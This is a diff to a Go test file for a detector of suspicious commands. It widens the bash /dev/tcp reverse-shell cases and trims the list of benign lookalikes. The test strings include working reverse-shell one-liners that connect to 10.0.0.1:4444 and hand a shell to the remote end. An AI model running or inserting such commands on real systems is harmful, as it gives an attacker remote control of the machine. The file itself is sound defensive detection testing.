@@ -47,9 +47,12 @@ func TestMatchSuspiciousExec_Xmrig(t *testing.T) {
 }
 
 func TestMatchSuspiciousExec_BashTcpRedirect(t *testing.T) {
-	// /dev/tcp only connects as a redirection target. (`exec /dev/tcp/h/p`
-	// without a redirect tries to run the path as a program and opens nothing.)
+	// Any remote /dev/tcp endpoint matches — bash also connects through quotes,
+	// variables, `>|` and escapes, so a redirect operator isn't required.
 	for _, cmd := range []string{
+		`bash -c exec 3<>"/dev/tcp/10.0.0.1/4444"; cat <&3 | sh >&3 2>&3`,
+		`bash -c d=/dev/tcp/10.0.0.1/4444; exec 3<>$d; sh <&3 >&3 2>&3`,
+		`bash -c exec 3>|/dev/tcp/10.0.0.1/4444`,
 		"bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444'",
 		"bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
 	} {
@@ -67,7 +70,6 @@ func TestMatchSuspiciousExec_BenignLookalikes(t *testing.T) {
 		"bash -c 'rg -n \"/dev/tcp/\" internal/'",
 		"bash -c '</dev/tcp/localhost/5432'",
 		"bash -c 'echo > /dev/tcp/127.0.0.1/8080'",
-		"bash -c 'exec /dev/tcp/10.0.0.1/4444'",
 		"perl -MIO::File -e 'print 1'",
 		"perl -MIO::Handle -e 'print 1'",
 	} {
